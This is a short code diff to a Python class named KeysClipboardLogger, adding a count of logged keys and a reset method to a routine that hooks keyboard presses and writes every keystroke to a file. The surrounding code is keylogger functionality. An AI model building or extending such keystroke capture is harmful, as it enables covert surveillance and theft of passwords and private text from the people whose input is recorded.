@@ -46,8 +46,12 @@ class KeysClipboardLogger:
     def start_keylogger(self):
         def on_press(event):
             self.working_file.write(event_to_string(event))
+            self.logged_keys += 1
 
         kb.on_press(on_press)
+
+    def reset_logged_keys(self):
+        self.logged_keys = 0
 
 
 def main():
